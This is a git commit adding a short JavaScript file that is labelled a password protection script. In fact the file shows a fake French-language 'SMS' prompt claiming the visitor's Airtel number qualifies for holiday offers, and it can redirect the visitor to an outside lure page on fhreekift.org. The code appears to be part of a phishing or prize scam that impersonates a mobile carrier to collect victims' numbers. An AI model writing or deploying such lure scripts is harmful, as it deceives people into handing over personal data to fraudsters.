4796825a11af28067fdae48c800ce1eb34d2ec2c
mfednewblog9 <newekpeitid@gmail.com>
2025-12-24 20:02:23 +0100

    Create my-airtel-active.js

---
+++ my-airtel-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'VÉRIFIER'
+password = prompt(
+  'SMS: Félicitations ! Votre numéro Airtel est éligible pour bénéficier des offres de Noël et du Nouvel An. Veuillez appuyer sur OK pour saisir votre numéro..',
+  'VÉRIFIER'
+);
+if (password != 'VÉRIFIER') {
+  location.href = 'https://fhreekift.org/airtel-fr.html';
+}
